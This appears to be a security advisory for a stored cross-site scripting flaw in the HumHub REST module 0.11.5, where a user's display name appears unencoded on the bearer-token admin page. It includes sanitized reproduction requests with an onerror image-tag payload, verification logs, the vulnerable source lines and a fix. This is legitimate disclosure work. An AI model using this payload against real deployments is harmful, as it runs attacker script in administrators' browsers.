# HumHub REST bearer-auth response displayName XSS

## Summary

HumHub REST 0.11.5 contains stored cross-site scripting in the bearer-token administration response. A user's unencoded display name is interpolated into the content argument of an HTML label after an administrator creates a token for that user. An authenticated user can store a crafted profile name that executes in the administrator's browser during this workflow.

## Affected product

- Vendor/project: **HumHub**
- Product: **RESTful API module**
- Affected version: **0.11.5**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker with a crafted profile name; administrator creates a bearer token for that user.

Verified flow: `profile displayName → bearer token model user → Yii translation → Html::label content`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Store an HTML marker in the attacker's profile display name.
2. As an administrator, create a REST bearer token for that user.
3. Inspect the one-time token response page label; do not retain the token value.

Sanitized request shape used during verification:

```http
# Attacker stores a crafted own display name
POST <BASE_URL>/user/account/edit
Cookie: <ATTACKER_SESSION_COOKIE>

_csrf=<CSRF>
Profile[firstname]=<img id=gt481023h7c
Profile[lastname]=src=x onerror=self.x=7>
save=Save profile

# Administrator creates a bearer token for that user
POST <BASE_URL>/rest/admin/bearer-auth
Cookie: <ADMIN_SESSION_COOKIE>

_csrf=<CSRF>
RestUserBearerToken[userIds][]=<ATTACKER_USER_ID>
RestUserBearerToken[expiration]=25/10/2026
RestUserBearerToken[expirationTime]=

# The one-time token value is intentionally not captured.
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h7a` | HTTP 200; raw_hit=true | **PASS** |
| 2 | `gt481023h7b` | HTTP 200; raw_hit=true | **PASS** |
| 3 | `gt481023h7c` | HTTP 200; raw_hit=true | **PASS** |

```text
Saved run-3 result:
profile_status: 200
form_status: 200
response_status: 200
raw_hit: true
label_snippet:
<label>Access Token for <img id=gt481023h7c src=x onerror=self.x=7></label>
one_time_token_retained: false
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
views/admin/bearer-auth.php:67-74
<?php if (!empty($bearerTokenModel->newToken)): ?>
...
<?= Html::label(Yii::t('RestModule.base', 'Access Token for {user}', [
    'user' => $bearerTokenModel->user->displayName
])); ?>
```

Root cause: The user display name is interpolated into the content argument of Html::label. The helper encodes attributes but treats label content as HTML.

## Recommended remediation

Pass Html::encode($bearerTokenModel->user->displayName) as the substitution, or build the label from a text-only component.

## References

- Official source: https://github.com/humhub/rest/blob/master/views/admin/bearer-auth.php

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-19 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-19/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-19 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-19/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-19 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-19/03-source-github-v3.png)
